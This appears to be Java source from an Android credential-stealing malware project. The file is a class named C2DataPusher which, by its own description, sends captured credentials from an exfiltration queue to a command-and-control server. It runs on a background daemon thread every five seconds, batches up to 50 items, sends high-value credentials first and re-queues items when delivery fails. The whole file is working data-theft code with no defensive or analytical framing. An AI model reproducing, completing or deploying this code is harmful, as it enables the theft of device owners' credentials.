package com.fason.app.features.springe.data;

import android.util.Log;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * C2DataPusher — Pumps captured credential data from ExfilQueue to the C2 server.
 *
 * Features:
 * - Automatic periodic flush (every 5 seconds when data is queued)
 * - Batched delivery (up to 50 items per message)
 * - Priority ordering (high-value credentials sent first)
 * - Backpressure handling (throttles if C2 is down)
 * - Graceful shutdown
 */
public final class C2DataPusher {

    private static final String TAG = "C2DataPusher";

    private static final int FLUSH_INTERVAL_SECONDS = 5;
    private static final int MAX_BATCH_SIZE = 50;

    private final ExfilQueue exfilQueue;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
        Thread t = new Thread(r, "springe-pusher");
        t.setDaemon(true);
        return t;
    });

    private volatile int totalPushed = 0;
    private volatile int totalFailed = 0;

    public C2DataPusher(ExfilQueue exfilQueue) {
        this.exfilQueue = exfilQueue;
    }

    /**
     * Start the automatic flush scheduler.
     */
    public void start() {
        if (running.compareAndSet(false, true)) {
            scheduler.scheduleAtFixedRate(
                this::flushBatch,
                FLUSH_INTERVAL_SECONDS,
                FLUSH_INTERVAL_SECONDS,
                TimeUnit.SECONDS
            );
            Log.d(TAG, "Data pusher started (interval=" + FLUSH_INTERVAL_SECONDS + "s)");
        }
    }

    /**
     * Manually flush all queued data immediately. Returns number of items pushed.
     */
    public int flushAll() {
        int pushed = 0;
        while (exfilQueue.size() > 0) {
            List<ExfilQueue.ExfilItem> batch = exfilQueue.dequeueBatch(MAX_BATCH_SIZE);
            if (batch.isEmpty()) break;
            if (sendBatch(batch)) {
                pushed += batch.size();
            } else {
                // Re-enqueue failed items
                for (ExfilQueue.ExfilItem item : batch) {
                    exfilQueue.enqueue(item.data, item.priority);
                }
                break;
            }
        }
        return pushed;
    }

    public int getTotalPushed() { return totalPushed; }
    public int getTotalFailed() { return totalFailed; }

    public void shutdown() {
        running.set(false);
        scheduler.shutdown();
        try {
            scheduler.awaitTermination(3, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {}
        flushAll(); // Final flush
        Log.d(TAG, "Data pusher shut down. Pushed: " + totalPushed + ", Failed: " + totalFailed);
    }

    /* ─── Internal ─── */

    private void flushBatch() {
        if (!running.get()) return;
        if (exfilQueue.size() == 0) return;

        List<ExfilQueue.ExfilItem> batch = exfilQueue.dequeueBatch(MAX_BATCH_SIZE);
        if (batch.isEmpty()) return;

        if (sendBatch(batch)) {
            totalPushed += batch.size();
        } else {
            // Re-enqueue on failure
            for (ExfilQueue.ExfilItem item : batch) {
                exfilQueue.enqueue(item.data, item.priority);
            }
            totalFailed += batch.size();
        }
    }

    /**
     * Send a batch of captured data to the C2 via the "springe" socket channel.
     */
    private boolean sendBatch(List<ExfilQueue.ExfilItem> items) {
        try {
            SocketClient socket = SocketClient.getSocket();
            if (socket == null || !socket.isConnected()) {
                Log.w(TAG, "Socket not connected, cannot push data");
                return false;
            }

            JSONArray captures = new JSONArray();
            for (ExfilQueue.ExfilItem item : items) {
                captures.put(item.data);
            }

            JSONObject message = new JSONObject();
            message.put("type", "springe_captures");
            message.put("captures", captures);
            message.put("count", captures.length());
            message.put("timestamp", System.currentTimeMillis());

            socket.emit("springe", message);
            Log.d(TAG, "Pushed " + captures.length() + " captures to C2");
            return true;

        } catch (Exception e) {
            Log.e(TAG, "Failed to push batch to C2", e);
            return false;
        }
    }
}
